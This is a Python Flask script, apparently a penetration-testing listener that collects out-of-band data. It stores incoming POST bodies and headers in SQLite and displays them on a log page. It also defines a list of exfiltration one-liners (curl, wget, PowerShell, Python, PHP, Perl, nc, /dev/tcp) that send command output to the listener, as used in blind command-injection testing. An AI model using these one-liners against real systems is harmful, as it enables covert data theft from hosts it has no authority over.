from __future__ import annotations  # noqa: F404
from flask import Flask, Request, request, render_template_string
import datetime
import sqlite3

# configuration
HOST = "0.0.0.0"
PORT = 7413
DB_FILE = "echout.db"
LIMIT = 50


def handle_record(record: EchoRecord):
    print(record)


# configuration end


# SOME
PAYLOADS = [
    f"pwd | curl --data-binary @- http://{HOST}:{PORT}/",
    f'wget --method=POST --body-data="$(pwd)" http://{HOST}:{PORT}/ -O -',
    f'ls | powershell -c "irm -Uri http://{HOST}:{PORT}/ -Method POST -Body ([Console]::In.ReadToEnd())"',
    f'python3 -c \'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("{HOST}",{PORT}));s.send(b"POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:%d\\r\\n\\r\\n%b"%(len(b),b.encode()))\'',
    f'python2 -c \'import os,socket;b=os.popen("pwd").read();s=socket.create_connection(("{HOST}",{PORT}));s.send("POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:%d\\r\\n\\r\\n%%s"%(len(b),b))\'',
    f'php -r \'$b=`pwd`; $s=fsockopen("{HOST}",{PORT}); fwrite($s,"POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:".strlen($b)."\\r\\n\\r\\n$b");\'',
    f'perl -e \'use IO::Socket::INET;$b=`pwd`;IO::Socket::INET->new(PeerAddr=>"{HOST}",PeerPort=>{PORT})->send("POST / HTTP/1.1\\r\\nHost:x\\r\\nContent-Length:".length($b)."\\r\\n\\r\\n$b")\'',
    f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length:${{#b}}\\r\\n\\r\\n$b" | nc {HOST} {PORT}',
    f'b=$(pwd); echo -ne "POST / HTTP/1.1\\r\\nHost: x\\r\\nContent-Length: ${{#b}}\\r\\n\\r\\n$b" > /dev/tcp/{HOST}/{PORT}',
    f"curl http://{HOST}:{PORT}/$(pwd)",
]

TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>echout logs</title>
<style>
  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
    background-color: #f6f8fa;
    padding: 24px;
    font-size: 13px;
  }

  table {
    width: 100%;
    border-collapse: collapse;
    background: white;
    border: 1px solid #d0d7de;
    border-radius: 6px;
    box-shadow: 0 1px 2px rgba(27,31,35,.05);
  }

  th, td {
    padding: 6px 10px;
    text-align: left;
    border-bottom: 1px solid #d0d7de;
    vertical-align: top;
    font-size: 13px;
    line-height: 1.3;
  }

  th {
    background-color: #f6f8fa;
    font-weight: 600;
    color: #24292f;
  }

  tr:hover {
    background-color: #f0f3f6;
  }

  code {
    font-family: SFMono-Regular, Consolas, 'Liberation Mono', Menlo, monospace;
    background: #f3f4f6;
    padding: 1px 3px;
    border-radius: 3px;
    font-size: 12px;
    color: #333;
  }

  pre {
    background: #f6f8fa;
    border: 1px solid #d0d7de;
    padding: 6px;
    border-radius: 4px;
    font-size: 12px;
    overflow-x: auto;
    margin: 0;
  }

  td:last-child {
    max-width: 300px;
    white-space: pre-wrap;
    word-break: break-word;
  }

  h1 {
    font-size: 20px;
    margin-bottom: 12px;
  }
</style>
</head>

<body>
<pre>There is no need to erase the history.</pre>
<h1>echout Logs</h1>
{% for payload in payloads %}
  <code>{{ payload }}<br></code>
{% endfor %}
<br>

<table>
  <thead>
    <tr>
      <th>TIMESTAMP</th>
      <th>IP</th>
      <th>DATA</th>
      <th>HEADERS</th>
    </tr>
  </thead>
<tbody>
  {% for record in records %}
    <tr>
      <td><code>{{ record[0] }}</code></td>
      <td><code>{{ record[1]}}</code></td>
      <td><code>{{ record[2] }}</code></td>
      <td><pre>{{ record[3]}}</pre></td>
    </tr>
  {% endfor %}
  </tbody>
</table>
</body>
</html>
"""
# SOME end


class EchoRecord:
    request: Request
    date: str
    ip: str
    data: str
    headers: str

    def __init__(self, request):
        self.request = request
        self.date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.ip = request.remote_addr
        self.data = request.get_data(as_text=True)
        self.headers = self.build_http_headers(request)

    def __str__(self):
        return f"{self.date} | {self.ip}\n{self.headers}\n\n{self.data}"

    def build_http_headers(self, request):
        request_line = f"{request.method} {request.full_path.rstrip('?')} HTTP/1.1"
        headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
        return f"{request_line}\r\n{headers}"


def init():
    with sqlite3.connect(DB_FILE) as DB:
        DB.execute(
            "CREATE TABLE IF NOT EXISTS echouts (date TEXT, ip TEXT, data TEXT, headers TEXT)"
        )
        DB.commit()


def query_records() -> list[EchoRecord]:
    with sqlite3.connect(DB_FILE) as DB:
        return DB.execute(
            "SELECT * FROM echouts ORDER BY date  DESC LIMIT ?", (LIMIT,)
        ).fetchall()


def save_record(record: EchoRecord):
    with sqlite3.connect(DB_FILE) as DB:
        DB.execute(
            "INSERT INTO echouts (date, ip, data, headers) VALUES (?, ?, ?, ?)",
            (record.date, record.ip, record.data, record.headers),
        )
        DB.commit()


# flask
app = Flask(__name__)


@app.route("/", methods=["GET"])
def show():
    records = query_records()
    return render_template_string(TEMPLATE, records=records, payloads=PAYLOADS)


@app.route("/", methods=["POST"])
def echo():
    er = EchoRecord(request)
    save_record(er)
    handle_record(er)
    return "Ok"


# get 会触发浏览器favicon.ico请求
@app.route("/<path:data>", methods=["POST"])
def echo_path(data):
    er = EchoRecord(request)
    er.data = data
    save_record(er)
    handle_record(er)
    return "Ok"


# flask end

# run app
if __name__ == "__main__":
    # init tables for db
    init()

    for payload in PAYLOADS:
        print(f"\n-\t{payload}")

    app.run(host=HOST, port=PORT, debug=False)
